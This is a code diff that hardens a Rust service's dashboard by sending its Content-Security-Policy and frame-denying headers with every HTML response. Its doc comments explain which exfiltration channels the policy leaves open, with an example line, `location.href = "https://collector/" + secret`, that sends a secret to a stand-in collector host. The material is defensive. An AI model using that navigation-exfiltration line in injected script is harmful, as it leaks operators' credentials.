@@ -587,6 +587,7 @@ async fn login(State(s): State<AppState>, Query(q): Query<LoginQuery>) -> Respon
     if !constant_time_eq(presented.as_bytes(), s.mgmt_token.as_bytes()) {
         return (
             StatusCode::UNAUTHORIZED,
+            DOCUMENT_HEADERS,
             Html("<h1>Invalid management token</h1><p>Open the dashboard URL honmoon printed at startup, or read the token from <code>~/.honmoon/mgmt-token</code>.</p>"),
         )
             .into_response();
@@ -709,9 +710,25 @@ async fn get_policy(State(s): State<AppState>) -> Json<PolicyResponse> {
 /// - `script-src 'self'` — only script served by this origin runs, so an
 ///   injected `<script>` element, an inline event handler and `eval` are all
 ///   refused. The embedded bundle is loaded from a file, never inlined.
-/// - `connect-src 'self'` — a credential that was read has nowhere to go. A
-///   script that did run could still drive the management API as the operator,
-///   but it could not `fetch` the secret out to a collector.
+/// - `connect-src 'self'` — the *scripted* channels that would carry a read
+///   credential off this origin are closed: `fetch`, `XMLHttpRequest`,
+///   `sendBeacon`, `EventSource`. Alongside `img-src 'self'` and `form-action
+///   'none'` that also covers the unscripted carriers — a beacon image, a CSS
+///   `url()`, a form post. A script that did run could still drive the
+///   management API as the operator, which is same-origin and always was.
+///
+/// **Those directives make exfiltration quieter and harder; they do not close
+/// it.** No CSP directive in a shipping browser restricts outbound
+/// *navigation*, so `location.href = "https://collector/" + secret` and
+/// `window.open` both leave with the credential in the URL — `navigate-to` was
+/// specified and then dropped. WebRTC sits outside `connect-src` for the same
+/// reason (ICE candidates reach an attacker's STUN host unless `webrtc 'block'`
+/// is set, which this does not set — closing it alone would change nothing
+/// while navigation stays open). The property to claim is therefore the one
+/// that is true: the channels that leave the page where it is are gone, and the
+/// one that navigates away is not. A later change that needs the stronger
+/// property has to add something this policy does not have, and must not read
+/// the list above as already supplying it.
 ///
 /// `default-src 'none'` makes everything not listed below a refusal rather than
 /// an inheritance, so a future asset class (a worker, a frame, a webfont from a
@@ -757,8 +774,11 @@ async fn get_policy(State(s): State<AppState>) -> Json<PolicyResponse> {
 /// page — and the demo build adds a second `<script src>` rather than inline
 /// code. That is a property of a bundler's output, not something this constant
 /// can enforce, so `scripts/check-dashboard-csp.ts` re-checks both built shells
-/// in CI: a bundler or dependency change that starts inlining script must break
-/// there rather than arrive as a blank dashboard.
+/// in CI: a bundler change that starts inlining script into the page must break
+/// there rather than arrive as a blank dashboard. That guard reads the shell's
+/// markup only — it would not see a dependency that puts `eval`/`new Function`
+/// in the emitted bundle, which this policy also refuses, since no
+/// `'unsafe-eval'` is present.
 const DASHBOARD_CSP: &str = concat!(
     "default-src 'none'; ",
     "script-src 'self'; ",
@@ -769,6 +789,24 @@ const DASHBOARD_CSP: &str = concat!(
     "form-action 'none'; ",
     "frame-ancestors 'none'",
 );
+
+/// The headers every HTML document this service returns carries.
+///
+/// A CSP binds the document it is served with, so a same-origin document served
+/// *without* one is an escape from this policy rather than a gap beside it: a
+/// script in the dashboard can open it (no directive restricts navigation — see
+/// above) and get a policy-free document on this origin to run in. So the rule
+/// is the whole rule — every response whose body a browser parses as HTML gets
+/// this list, which is `static_handler`'s two arms and `/login`'s refusal page.
+///
+/// Nothing else here returns a document: `/healthz` and the two 404 arms are
+/// `text/plain`, `/api/*` is JSON, and `/login`'s success arm is a `303` whose
+/// body a browser never renders. Those are the responses deliberately absent
+/// from this list, named so the absence is not read as an oversight.
+const DOCUMENT_HEADERS: [(header::HeaderName, &str); 2] = [
+    (header::X_FRAME_OPTIONS, "DENY"),
+    (header::CONTENT_SECURITY_POLICY, DASHBOARD_CSP),
+];
 
 /// Serve an embedded dashboard asset, falling back to `index.html` so client-side
 /// routing works (SPA). Returns 404 only when the dashboard was not built in.
@@ -787,11 +825,8 @@ async fn static_handler(uri: Uri) -> Response {
     if let Some(asset) = Assets::get(path) {
         let mime = mime_guess::from_path(path).first_or_octet_stream();
         return (
-            [
-                (header::CONTENT_TYPE, mime.as_ref()),
-                (header::X_FRAME_OPTIONS, "DENY"),
-                (header::CONTENT_SECURITY_POLICY, DASHBOARD_CSP),
-            ],
+            [(header::CONTENT_TYPE, mime.as_ref())],
+            DOCUMENT_HEADERS,
             asset.data.into_owned(),
         )
             .into_response();
@@ -799,14 +834,7 @@ async fn static_handler(uri: Uri) -> Response {
 
     // SPA fallback: serve index.html for unknown non-asset paths.
     match Assets::get("index.html") {
-        Some(asset) => (
-            [
-                (header::X_FRAME_OPTIONS, "DENY"),
-                (header::CONTENT_SECURITY_POLICY, DASHBOARD_CSP),
-            ],
-            Html(asset.data.into_owned()),
-        )
-            .into_response(),
+        Some(asset) => (DOCUMENT_HEADERS, Html(asset.data.into_owned())).into_response(),
         None => (
             StatusCode::NOT_FOUND,
             "dashboard not built — run `bun run --filter @honmoon/dashboard build`",
